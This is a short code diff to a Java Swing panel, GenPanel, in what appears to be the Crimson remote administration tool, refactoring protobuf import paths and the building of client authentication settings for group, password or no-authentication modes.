@@ -59,10 +59,10 @@ import javax.swing.border.LineBorder;
 import javax.swing.border.TitledBorder;
 
 import com.subterranean_security.crimson.core.Common;
-import com.subterranean_security.crimson.core.proto.net.Gen;
-import com.subterranean_security.crimson.core.proto.net.Auth.AuthType;
-import com.subterranean_security.crimson.core.proto.net.Gen.ClientConfig;
-import com.subterranean_security.crimson.core.proto.net.Gen.NetworkTarget;
+import com.subterranean_security.crimson.core.proto.ClientAuth.AuthType;
+import com.subterranean_security.crimson.core.proto.ClientAuth.Group;
+import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
+import com.subterranean_security.crimson.core.proto.Generator.NetworkTarget;
 import com.subterranean_security.crimson.core.ui.StatusLabel;
 import com.subterranean_security.crimson.core.util.CUtil;
 import com.subterranean_security.crimson.core.util.Crypto;
@@ -590,7 +590,7 @@ public class GenPanel extends JPanel {
 		JLabel lblThisClientWill = new JLabel("This client will be able to authenticate with any server!");
 		lblThisClientWill.setFont(new Font("Dialog", Font.BOLD, 10));
 		authpanel_none.add(lblThisClientWill);
-		
+
 		JLabel lblSslEncryptionWill = new JLabel("SSL encryption will still be used");
 		lblSslEncryptionWill.setFont(new Font("Dialog", Font.BOLD, 10));
 		authpanel_none.add(lblSslEncryptionWill);
@@ -765,8 +765,7 @@ public class GenPanel extends JPanel {
 		switch ((String) authType.getSelectedItem()) {
 		case "Group": {
 			ic.setAuthType(AuthType.GROUP);
-			ic.setGroup(
-					Gen.Group.newBuilder().setName(fld_group_name.getText()).setKey(CUtil.Misc.randString(64)).build());
+			ic.setGroup(Group.newBuilder().setName(fld_group_name.getText()).setKey(CUtil.Misc.randString(64)).build());
 			break;
 		}
 		case "Password": {
